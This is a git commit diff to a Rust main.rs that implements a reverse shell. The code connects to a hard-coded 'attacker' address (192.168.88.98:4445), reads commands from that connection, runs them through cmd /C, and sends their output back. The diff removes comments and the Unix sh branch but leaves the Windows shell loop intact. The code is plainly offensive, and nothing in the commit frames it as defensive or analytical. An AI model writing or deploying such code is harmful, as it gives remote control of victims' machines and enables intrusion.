ceca8c56053d2a6beae00f2bb2e1661dba2d1736
Indra Z <30687786+sigeri94@users.noreply.github.com>
2024-07-25 10:12:16 +0700

    Update main.rs

--- main.rs
+++ main.rs
@@ -7,13 +7,11 @@ fn main() {
     let attacker_ip = "192.168.88.98";
     let attacker_port = "4445";
 
-    // Create the connection to the attacker's server
     let server_address = format!("{}:{}", attacker_ip, attacker_port);
     if let Ok(mut stream) = TcpStream::connect(server_address) {
         let mut reader = BufReader::new(stream.try_clone().unwrap());
 
         loop {
-            // Read command from the stream
             let mut command = String::new();
             if reader.read_line(&mut command).unwrap() == 0 {
                 break;
@@ -23,7 +21,6 @@ fn main() {
                 break;
             }
 
-            // Execute the command
             let output = if cfg!(target_os = "windows") {
                 Command::new("cmd")
                     .args(&["/C", &command])
@@ -31,17 +28,8 @@ fn main() {
                     .stderr(Stdio::piped())
                     .output()
                     .expect("failed to execute process")
-            } else {
-                Command::new("sh")
-                    .arg("-c")
-                    .arg(&command)
-                    .stdout(Stdio::piped())
-                    .stderr(Stdio::piped())
-                    .output()
-                    .expect("failed to execute process")
             };
 
-            // Send the output back to the attacker
             stream.write_all(&output.stdout).unwrap();
             stream.write_all(&output.stderr).unwrap();
         }
